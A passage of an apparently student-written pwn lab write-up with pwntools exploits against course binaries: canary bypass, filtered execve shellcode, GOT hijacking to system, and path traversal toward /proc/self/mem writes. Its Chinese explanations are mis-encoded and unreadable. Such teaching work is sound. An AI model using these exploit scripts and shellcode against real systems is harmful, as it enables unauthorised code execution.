rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f&#39;win address = {hex(win_addr)}&#39;)
log.info(f&#39;RSP value = {hex(rsp_val)}&#39;)
log.info(f&#39;Stack Canary = {hex(stack_canary)}&#39;)
log.info(f&#39;RBP value = {hex(rbp_val)}&#39;)
log.info(f&#39;RIP value = {hex(rip)}&#39;)

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f&#39;Payload = {payload}&#39;)
# raw_input()
r.sendline(payload)

r.interactive()</code></pre></div><h2 id=lab-shellcode>Lab-Shellcode</h2><p>Flag: <code>flag{How_you_do0o0o0o_sysca1111111}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-1>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œå…¶å¯¦å’Œ<a href=https://hackmd.io/@SBK6401/HJ0Yn79ih rel=external target=_blank>pico-filtered shellcode</a>æœ‰é»åƒï¼Œä¸»è¦å°±æ˜¯é–‹å€‹RWXæ¬Šé™çš„ç©ºé–“ï¼Œæœ€å¾Œè·³éå»åŸ·è¡Œå¯«çš„shellcodeï¼Œä¸¦ä¸”åœ¨è·³éå»ä¹‹å‰æœƒæª¢æŸ¥ä¸€äº›æ±è¥¿ï¼Œåƒé€™ä¸€é¡Œå°±æ˜¯æª¢æŸ¥æœ‰æ²’æœ‰0x0fæˆ–0x05çš„byteï¼Œå¦‚æœæœ‰å°±å¡«æˆ0ï¼Œå¯ä»¥è§€å¯Ÿä¸€ä¸‹å¯«æˆshellcodeéå¾Œçš„hexåˆ°åº•é•·æ€éº¼æ¨£</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> disasm(asm(<span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rax, 0x68732f6e69622f
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    push rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rsi, rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rax, 0x3b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>:   <span style=color:#ae81ff>48</span> b8 <span style=color:#ae81ff>2</span>f <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>6</span>e <span style=color:#ae81ff>2</span>f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span>   movabs rax, <span style=color:#ae81ff>0x68732f6e69622f</span>
</span></span><span style=display:flex><span>   a:   <span style=color:#ae81ff>50</span>                      push   rax
</span></span><span style=display:flex><span>   b:   <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e7                mov    rdi, rsp
</span></span><span style=display:flex><span>   e:   <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>31</span> f6                xor    rsi, rsi
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>11</span>:   <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>31</span> d2                xor    rdx, rdx
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>14</span>:   <span style=color:#ae81ff>48</span> c7 c0 <span style=color:#ae81ff>3</span>b <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    mov    rax, <span style=color:#ae81ff>0x3b</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>b:   <span style=color:#ae81ff>0</span>f <span style=color:#ae81ff>05</span>                   syscall<span style=color:#e6db74>&#39;</span></span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°0f 05å°±æ˜¯syscallçš„op codeï¼Œä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœæŒ‰ç…§æœ€ç°¡å–®çš„shellcodeé€éå»åˆ°æœ€å¾Œæœƒæ²’æœ‰syscallå»å‘¼å«execveï¼Œæ‰€ä»¥æˆ‘å€‘è¦ç”¨ä¸€äº›æ–¹å¼å»bypassé€™å€‹filterï¼Œä¾‹å¦‚å¯ä»¥å…ˆåƒTAä¸Šèª²èªªçš„ï¼ŒæŠŠ0x0e04æ”¾åˆ°registerå¾Œé€éåŠ æ¸›è‡ªè¡Œé‚„åŸå‡º0x0f05é€™æ±è¥¿ï¼Œå†æŠŠä»–æ”¾åˆ°å°æ‡‰çš„addresså°±å¯ä»¥äº†</p><h3 id=exploit>Exploit</h3><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;./lab&#39;)
r = remote(&#39;10.113.184.121&#39;, 10042)
context.arch = &#39;amd64&#39;


# payload = asm(&#39;&#39;&#39;
#     mov rax, 0x68732f6e69622f
#     push rax
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     mov rcx, 0x040e
#     add rcx, 0x0101
#     mov qword [rip-0x8], rcx
# &#39;&#39;&#39;)
payload = b&#39;H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00H\xc7\xc1\x0e\x04\x00\x00H\x81\xc1\x01\x01\x00\x00H\x89\r\x00\x00\x00\x00&#39;
raw_input()
r.sendline(payload)

r.interactive()</code></pre></div><h2 id=lab-got>Lab-Got</h2><p>Flag: <code>flag{Libccccccccccccccccccccccccccc}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-2>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œå°±å’Œ<a href=https://hackmd.io/@SBK6401/S1BBpSR5s rel=external target=_blank>0x06(GOT hijacking)</a>å·®ä¸å¤šï¼Œé¦–å…ˆæœ‰å¹¾å€‹æ¢ä»¶æ‰èƒ½é”åˆ°é€™å€‹æ”»æ“Š</p><ol><li>è¦hijackçš„functionåœ¨å®Œæˆhijackä¹‹å¾Œç•¶ç„¶é‚„è¦å†å‘¼å«ä¸€æ¬¡ï¼Œé€™æ¨£æ‰æœƒçœŸçš„åŸ·è¡Œæ”»æ“Š</li><li>ä¿è­·ä¸èƒ½æ˜¯Full RELROï¼Œé€™æ¨£æ‰æœƒåŸ·è¡Œlazy bindingçš„æ©Ÿåˆ¶</li></ol><p>é€™ä¸€é¡Œéƒ½æœ‰é”æˆï¼Œé¦–å…ˆé¡Œç›®é–‹ä¸€å€‹arrayï¼Œæˆ‘å€‘å¯ä»¥è¼¸å…¥arrayçš„indexï¼Œé¡Œç›®æœƒreturnè©²indexçš„valueåˆ°å‰ç«¯ï¼Œè€Œé¡Œç›®ä¸¦æ²’æœ‰é‡å°æˆ‘çš„è¼¸å…¥é€²è¡Œfilteræˆ–æª¢æŸ¥ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥åˆ°ä»»æ„è®€å–ï¼Œä¸¦ä¸”å¯ä»¥é‡å°è©²indexé”åˆ°ä»»æ„å¯«å…¥(å› ç‚ºé¡Œç›®æœ‰é–‹é€™æ¨£çš„åŠŸèƒ½)ï¼Œæ‰€ä»¥æˆ‘å€‘å°±å¯ä»¥å…ˆåˆ°è™•çœ‹ä¸€ä¸‹è¼¸å…¥ä¸åŒçš„indexæœƒåå‡ºç”šéº¼æ¨£çš„æ±è¥¿</p><ol><li>é¦–å…ˆè¦çŸ¥é“arråœ¨å“ªé‚Š
<a href=#R-image-c89c9ab6b66cf93cedeaeb8ffe540073 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkdauHJEa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c89c9ab6b66cf93cedeaeb8ffe540073><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkdauHJEa.png></a>
å¯ä»¥çœ‹åˆ°ä»–æ‡‰è©²åœ¨offset 0x4048çš„åœ°æ–¹<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  vmmap
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Legend:  Code | Heap | Stack <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Start              End                Offset             Perm Path
</span></span><span style=display:flex><span>0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab1/got/share/lab
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>0x555555558048 &lt;arr&gt;:   0x00000000000004d2      0x00007ffff7fa2780
</span></span><span style=display:flex><span>0x555555558058: 0x0000000000000000      0x00007ffff7fa1aa0
</span></span><span style=display:flex><span>0x555555558068 &lt;completed.0&gt;:   0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>0x555555558078: 0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>0x555555558088: 0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>gefâ¤  x/10gx 0x0000555555554000+0x4048-0x30
</span></span><span style=display:flex><span>0x555555558018 &lt;__stack_chk_fail@got.plt&gt;:      0x0000555555555030      0x00007ffff7de8770
</span></span><span style=display:flex><span>0x555555558028 &lt;setvbuf@got.plt&gt;:       0x00007ffff7e09670      0x0000555555555060
</span></span><span style=display:flex><span>0x555555558038: 0x0000000000000000      0x0000555555558040
</span></span><span style=display:flex><span>0x555555558048 &lt;arr&gt;:   0x00000000000004d2      0x00007ffff7fa2780
</span></span><span style=display:flex><span>0x555555558058: 0x0000000000000000      0x00007ffff7fa1aa0
</span></span><span style=display:flex><span>gefâ¤  got
</span></span><span style=display:flex><span>GOT protection: Partial RelRO | GOT functions: <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x555555558018<span style=color:#f92672>]</span> __stack_chk_fail@GLIBC_2.4  â†’  0x555555555030
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x555555558020<span style=color:#f92672>]</span> printf@GLIBC_2.2.5  â†’  0x7ffff7de8770
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x555555558028<span style=color:#f92672>]</span> setvbuf@GLIBC_2.2.5  â†’  0x7ffff7e09670
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x555555558030<span style=color:#f92672>]</span> __isoc99_scanf@GLIBC_2.7  â†’  0x555555555060</span></span></code></pre></div>å¯ä»¥çœ‹åˆ°Printfçš„got addressæ˜¯åœ¨<code>0x7ffff7de8770</code>ï¼Œå¦‚æœæ˜¯ä»¥arrçš„indexä¾†èªªå°±æ˜¯==-5==ï¼Œæ‰€ä»¥æˆ‘å€‘è¦Hijackçš„ç›®æ¨™å°±å¾ˆæ¸…æ¥šï¼Œprintfå¾Œé¢æœƒprintå‡º<code>/bin/sh\x00</code>ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥è®€å–printfçš„åœ°å€å¾Œreturn to libcï¼Œå†ç”¨offsetå›åˆ°system<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ldd lab
</span></span><span style=display:flex><span>    linux-vdso.so.1 <span style=color:#f92672>(</span>0x00007ffc09506000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style=color:#f92672>(</span>0x00007f50dc33d000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    /lib64/ld-linux-x86-64.so.2 <span style=color:#f92672>(</span>0x00007f50dc577000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
</span></span><span style=display:flex><span>2922: <span style=color:#ae81ff>0000000000060770</span>   <span style=color:#ae81ff>204</span> FUNC    GLOBAL DEFAULT   <span style=color:#ae81ff>15</span> printf@@GLIBC_2.2.5
</span></span><span style=display:flex><span>$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
</span></span><span style=display:flex><span>1481: 0000000000050d60    <span style=color:#ae81ff>45</span> FUNC    WEAK   DEFAULT   <span style=color:#ae81ff>15</span> system@@GLIBC_2.2.5</span></span></code></pre></div>(é€™æ˜¯ç­†é›»çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æœƒå’Œexploitçš„scriptä¸å¤ªä¸€æ¨£)<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  p 0x7ffff7de8770-0x60770+0x50d0
</span></span><span style=display:flex><span>$1 <span style=color:#f92672>=</span> 0x7ffff7dd8d60
</span></span><span style=display:flex><span>gefâ¤  x/10gx 0x7ffff7dd8d60
</span></span><span style=display:flex><span>0x7ffff7dd8d60 &lt;__libc_system&gt;: 0x74ff8548fa1e0ff3      0x9066fffffb82e907
</span></span><span style=display:flex><span>0x7ffff7dd8d70 &lt;__libc_system+16&gt;:      0x253d8d4808ec8348      0xfffffb70e8001879
</span></span><span style=display:flex><span>0x7ffff7dd8d80 &lt;__libc_system+32&gt;:      0xc48348c0940fc085      0x001f0fc3c0b60f08
</span></span><span style=display:flex><span>0x7ffff7dd8d90 &lt;realpath_stk&gt;:  0x5441554156415741      0x000898ec81485355
</span></span><span style=display:flex><span>0x7ffff7dd8da0 &lt;realpath_stk+16&gt;:       0x4864082474894800      0x480000002825048b</span></span></code></pre></div></li></ol><h3 id=exploit-1>Exploit</h3><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process(&#39;./lab&#39;)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10043</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>idx <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-5&#39;</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;idx: &#39;</span>, idx)
</span></span><span style=display:flex><span>printf_addr <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> printf_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x606f0</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50d70</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;printf address = </span><span style=color:#e6db74>{</span>hex(printf_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;system address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># raw_input()</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;val: &#39;</span>, str(system_addr)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()</span></span></code></pre></div><h2 id=hw-notepad-stage1>HW-Notepad-Stage1</h2><p>Flag: <code>flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-3>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œæ˜¯ç­‰åˆ°åŠ©æ•™çµ¦å‡ºhintæ‰ä¹‹åˆ°å¤§æ¦‚çš„æ–¹å‘ï¼Œæˆ‘ä¸€é–‹å§‹ä¹Ÿæ˜¯æœ‰ä¸€äº›åˆæ­¥çš„æ–¹å‘ï¼Œä¸éä¸çŸ¥é“æ€éº¼æŠŠå¡ä½çš„åœ°æ–¹è§£æ±ºï¼Œæœ€å¾Œä¹Ÿæ˜¯æ±‚åŠ©@davidchenå­¸é•·æ‰çŸ¥é“ç¢ºåˆ‡çš„æ–¹æ³•ã€‚</p><ol><li><p>é¦–å…ˆï¼Œæ„Ÿè¬@csotaku çš„æç¤ºèˆ‡åˆ‡å…¥æ–¹å‘ï¼Œæ—¢ç„¶çŸ¥é“æ˜¯path traversalçš„æ´ï¼Œé‚£å°±ä»£è¡¨æŸå€‹åœ°æ–¹æˆ‘å€‘å¯ä»¥è¼¸å…¥ä¸€äº›ç°¡å–®çš„payloadï¼Œä¾‹å¦‚<code>./</code>ï¼Œè€Œé€™å€‹åœ°æ–¹é‚„å¿…é ˆå’Œè®€æª”æœ‰é—œä¿‚ï¼Œæƒ³åˆ°é€™é‚Šæˆ‘å€‘çš„é¸æ“‡ä¹Ÿå‘¼ä¹‹æ¬²å‡ºï¼Œæ´å°±åœ¨==openfile==çš„åœ°æ–¹ï¼Œæˆ‘å€‘è¼¸å…¥çš„notenameæœƒå’Œ<code>res.res</code>ä»¥åŠ<code>.txt</code> concatenateåœ¨ä¸€èµ·ï¼Œï¼Œä¸éé€™é‚Šæœ‰å€‹å•é¡Œæ˜¯æ—¢ç„¶æˆ‘å€‘è¦é †åˆ©è®€æª”ï¼Œåœ¨èªªæ˜ä¸­å°±æœ‰æåˆ°æª”æ¡ˆåç¨±æ˜¯==flag_user==ï¼Œè€Œä¸æ˜¯flag_user.txtï¼Œé€™æ¨£çš„è©±æˆ‘å€‘å°±æ‡‰è©²è¦æƒ³è¾¦æ³•æŠŠ<code>.txt</code> bypassæ‰</p><p>æƒ³åˆ°é€™é‚Šæˆ‘å…ˆèªªæˆ‘çš„çœ‹æ³•ï¼Œå¦‚æœè¦æŠŠ<code>.txt</code> bypassæ‰ï¼Œä¸€é–‹å§‹æ˜¯åƒè€ƒ<a href=https://feifei.tw/file-path-traversal/ rel=external target=_blank>é£›é£›çš„ç¶²ç«™ç¯„ä¾‹</a>ä¸­æœ‰é‡å°URL basedçš„path traversalé¡ä¼¼çš„æƒ…æ³åœ¨payloadçš„æœ€å¾Œé¢åŠ ä¸Šnull byteï¼Œæ‰€ä»¥æˆ‘æƒ³å¯ä»¥ç”¨åŒæ¨£çš„æ–¹å¼bypass(<code>\x00</code>)ï¼Œä½†æ˜¯æ€æ¨£çš„æ²’æœ‰æˆåŠŸï¼Œå¦å¤–æˆ‘é‚„æœ‰ä¸€å€‹ç–‘å•ï¼Œres.resçš„éƒ¨åˆ†åˆ°åº•æ˜¯ä¸æ˜¯ä¸€å€‹pathï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä»£è¡¨æˆ‘å€‘ä¹Ÿéœ€è¦æŠŠå®ƒè“‹æ‰æˆ–æ˜¯ç”¨å…¶ä»–æ–¹æ³•leakå‡ºä¾†ä¹‹é¡çš„ï¼›ç•¶ç„¶å¦‚æœæ˜¯pathçš„è©±å°±æ²’å·®äº†ï¼Œä½†æˆ‘å¾ˆå¸¸é™·å…¥é€™ç¨®æ²’æœ‰å¿…è¦çš„è¿´åœˆè½‰ä¸å‡ºä¾†ï¼Œå…¶å¯¦ç¾åœ¨ä»”ç´°æƒ³æƒ³ï¼Œä»–ä¸€å®šæ˜¯ä¸€å€‹pathï¼Œå› ç‚ºä»–æœ€å¾Œä¹Ÿæ˜¯è¦å’Œ<code>{notename}.txt</code>æ¥åœ¨ä¸€èµ·ï¼Œå¦‚æœä»–ä¸æ˜¯pathå°±ä¸€å®šè®€ä¸åˆ°</p></li><li><p>åæ­£å¾Œä¾†å’Œ@davidchenè¨è«–å®Œæ‰å¤§è‡´çŸ¥é“å¦‚ä½•å¯«scriptï¼Œç°¡å–®ä¾†èªªï¼Œå› ç‚ºpathçš„é™åˆ¶é•·åº¦æ˜¯128 bytesï¼Œæ‰€ä»¥<code>res.res</code> + {notename} + <code>.txt</code>åŸºæœ¬ä¸Šé•·åº¦ä¸æœƒè¶…é128 bytesï¼Œå¦‚æœæœƒçš„è©±å°±æœƒè¢«æ“ å‡ºå»ï¼Œæ‰€ä»¥æˆ‘å€‘èƒ½å¤ æ§åˆ¶çš„éƒ¨åˆ†å°±æ˜¯notenameï¼Œé›–ç„¶æˆ‘å€‘ä¸çŸ¥é“<code>res.res</code>çš„é•·åº¦å¤šå°‘ï¼Œä½†æˆ‘å€‘å¯ä»¥çˆ†ç ´ï¼Œè®“é€™ä¸‰è€…ä¸²åœ¨ä¸€èµ·æœƒå¤§æ–¼128 bytesä¸¦ä¸”æ²’æœ‰è¢«å¯«å…¥pathçš„éƒ¨åˆ†å°±æ˜¯<code>.txt</code>ï¼Œé€™æ¨£çš„è©±å°±å¯ä»¥é †åˆ©è®€åˆ°flagçš„å…§å®¹ï¼Œå…·é«”æ€éº¼åšå°±æ˜¯ä¸€ç›´åŠ ä¸Š<code>/</code></p></li></ol><h2 id=hw-notepad-stage2>HW-Notepad-Stage2</h2><p>Flag: <code>flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-4>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::</p><ul><li>Recap
åœ¨ä¸Šä¸€é¡Œï¼Œæˆ‘å€‘å·²ç¶“çŸ¥é“äº†ä»–çš„å‰ç«¯æ¼æ´ç‚ºpath traversalï¼Œæ›è¨€ä¹‹æ˜¯ä¸æ˜¯å¯ä»¥åšåˆ°ä»»æ„è®€å–çš„åŠŸèƒ½ï¼Œå¦‚ä¸‹:<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_any_file</span>(file_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;../../../../../../&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>89</span> <span style=color:#f92672>-</span> len(file_name)) <span style=color:#f92672>+</span> file_name
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> dealing_cmd(r, <span style=color:#ae81ff>5</span>, payload, offset<span style=color:#f92672>=</span>str(offset)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(ret, len(ret))</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;Read note failed.&#39;</span> <span style=color:#f92672>and</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;Couldn&#39;t open the file.&#34;</span>:
</span></span><span style=display:flex><span>            res <span style=color:#f92672>+=</span> ret
</span></span><span style=display:flex><span>            offset <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>success(res)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res</span></span></code></pre></div></li></ul><ol><li><p>==æ¼æ´ç™¼æƒ³==
é€é@cs-otakuçš„WPï¼Œäº†è§£åˆ°å¦‚æœå¯ä»¥åšåˆ°ä»»æ„è®€å–æœ‰ç”šéº¼å²å®³çš„åœ°æ–¹å‘¢?é‚£æˆ‘å€‘å°±å¯ä»¥æƒ³è¾¦æ³•ç”¨è©²é¡Œæä¾›çš„write_noteçš„åŠŸèƒ½ä»¥åŠlseekçš„åŠŸèƒ½ï¼Œå¯«å…¥==/proc/self/mem==é€™å€‹æª”æ¡ˆï¼Œé€™æ˜¯ç”šéº¼æ±è¥¿å‘¢?å¯ä»¥çœ‹ä¸€ä¸‹<a href=http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/ rel=external target=_blank>è™›æ“¬å…§å­˜æ¢ç©¶ &ndash; ç¬¬ä¸€ç¯‡:C strings & /proc</a>ï¼Œè¦åšçš„äº‹æƒ…å’Œæˆ‘å€‘çš„å¹¾ä¹ä¸€æ¨£ï¼Œç°¡å–®èªªå°±æ˜¯</p><blockquote><p>/proc/[pid]/mem
This file can be used to access the pages of a process&rsquo;s memory through open(2), read(2), and lseek(2).
Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).</p><p>/proc/[pid]/maps
A file containing the currently mapped memory regions and their access permissions. See mmap(2) for some further information about memory mappings.
Permission to access this file is governed by a ptrace access mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).
The format of the file is:</p><pre><code>   address           perms offset  dev   inode       pathname
   00400000-00452000 r-xp 00000000 08:02 173521      /usr/bin/dbus-daemon
   00651000-00652000 r--p 00051000 08:02 173521      /usr/bin/dbus-daemon
   00652000-00655000 rw-p 00052000 08:02 173521      /usr/bin/dbus-daemon
   00e03000-00e24000 rw-p 00000000 00:00 0           [heap]
   00e24000-011f7000 rw-p 00000000 00:00 0           [heap]
   ...
   35b1800000-35b1820000 r-xp 00000000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a1f000-35b1a20000 r--p 0001f000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a20000-35b1a21000 rw-p 00020000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a21000-35b1a22000 rw-p 00000000 00:00 0
   35b1c00000-35b1dac000 r-xp 00000000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1dac000-35b1fac000 ---p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1fac000-35b1fb0000 r--p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1fb0000-35b1fb2000 rw-p 001b0000 08:02 135870  /usr/lib64/libc-2.15.so
   ...
   f2c6ff8c000-7f2c7078c000 rw-p 00000000 00:00 0    [stack:986]
   ...
   7fffb2c0d000-7fffb2c2e000 rw-p 00000000 00:00 0   [stack]
   7fffb2d48000-7fffb2d49000 r-xp 00000000 00:00 0   [vdso]
</code></pre></blockquote><p>å¾ä»¥ä¸Šè¨Šæ¯æˆ‘å€‘çŸ¥é“ï¼Œ/proc/[pid]/memå°±æ˜¯å¯¦éš›åŸ·è¡Œè©²éš»processçš„memoryï¼Œè€Œ/proc/[pid]/mapså°±æ˜¯è©²éš»processçš„memory mappingï¼Œæ‰€ä»¥é—œæ–¼æ€éº¼åˆ©ç”¨å¯ä»¥çœ‹ä¸€ä¸‹<a href=https://blog.csdn.net/dog250/article/details/108618568 rel=external target=_blank>csdnçš„é€™ç¯‡æ–‡ç« </a>ï¼ŒåŸºæœ¬ä¸Šè¦åšçš„äº‹æƒ…å’Œæˆ‘å€‘å·®ä¸å¤šï¼Œç›®æ¨™éƒ½æ˜¯å»ä¿®æ”¹/proc/[pid]/memä¸­çš„valueï¼Œä¸éä¸­é–“æœ‰å¾ˆå¤šæ±è¥¿éœ€è¦è€ƒæ…®:</p><ol><li>è¦å¯«ç”šéº¼shellcode</li><li>è¦å¯«å»å“ªè£¡</li></ol></li><li><p>å…ˆçœ‹è¦å¯«å»å“ªè£¡
